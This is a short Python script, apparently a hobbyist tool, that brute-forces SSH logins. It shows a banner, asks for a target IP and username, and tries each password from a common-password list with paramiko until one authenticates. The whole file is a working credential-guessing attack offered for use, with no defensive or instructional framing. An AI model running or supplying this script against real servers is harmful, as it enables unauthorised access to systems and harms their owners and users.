from pwn import *
import paramiko

# Function to display the banner
def display_banner():
    banner = """
███████╗███████╗██╗  ██╗██╗  ██╗██╗  ██╗██╗  ██╗██╗  ██╗         ██╗
██╔════╝██╔════╝██║  ██║██║  ██║██║  ██║██║  ██║██║  ██║         ██║
███████╗███████╗███████║███████║███████║███████║███████║         ██║
╚════██║╚════██║██╔══██║██╔══██║██╔══██║██╔══██║██╔══██║         ╚═╝
███████║███████║██║  ██║██║  ██║██║  ██║██║  ██║██║  ██║██╗██╗██╗██╗
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝╚═╝
    -by namikaze88
"""

    print(banner)

display_banner()

host = input("Enter the IP address of the SSH server: ")
username = input("Enter the username: ")
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting Password: '{}'!".format(attempts, password))
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(host, username=username, password=password, timeout=1)
            print("[>] Valid password found: '{}'!".format(password))
            ssh_client.close()
            break
        except paramiko.AuthenticationException:
            print("[X] Invalid password")
        except paramiko.SSHException as e:
            print("[X] SSH error:", str(e))
        except Exception as e:
            print("[X] An error occurred:", str(e))
        attempts += 1

